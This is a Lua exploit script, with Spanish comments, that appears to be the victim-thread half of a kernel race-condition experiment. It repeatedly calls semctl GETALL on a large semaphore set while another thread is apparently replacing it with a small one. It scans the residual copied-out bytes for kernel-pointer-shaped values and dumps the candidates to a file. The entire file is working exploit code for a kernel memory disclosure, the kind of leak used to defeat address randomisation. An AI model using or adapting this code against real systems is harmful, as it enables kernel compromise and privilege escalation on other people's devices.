-- exp21_race_victim.lua — HILO B: GETALL/SETALL repetidos durante el martilleo
-- Exp1a (disclosure): snapshot grande -> set nuevo pequeño -> copyout largo residual
local E = require("common_1352")
local tries = tonumber(arg and arg[1]) or 5000
local BIG, SMALL = 64, 4

-- crear set grande propio (el que la carrera sustituirá por uno pequeño)
local sid = syscall.semget(0x1353, BIG, E.IPC_CREAT + 0x1B6)
if not (sid and sid >= 0) then error("no pude crear set víctima") end

local outbuf = malloc(BIG * 2)
local argp = malloc(8); write64(argp, outbuf)
local hits, cand = 0, 0

for t = 1, tries do
    local r = E.try(syscall.__semctl, sid, 0, E.GETALL, argp)
    if r == 0 then
        -- analizar cola [SMALL*2 .. BIG*2) buscando valores con forma de puntero
        local data = read_buffer(outbuf, BIG * 2)
        for off = SMALL * 2 + 1, BIG * 2 - 8, 8 do
            local v = string.unpack("<I8", data, off)
            if v ~= 0 and v >= 0x800000000000ULL then
                cand = cand + 1
                E.log("VICTIM", "intento %d off %#x LEAK? %#018x", t, off - 1, v)
                file_write("/data/residual_leak.bin",
                           string.sub(data, off), "ab")
            end
        end
    elseif r and r < 0 then
        hits = hits + 1   -- EINVAL silencioso = carrera perdida (normal)
    end
end
syscall.__semctl(sid, 0, E.IPC_RMID, 0)
E.log("VICTIM", "fin: %d intentos, %d fallos silenciosos, %d candidatos leak",
      tries, hits, cand)
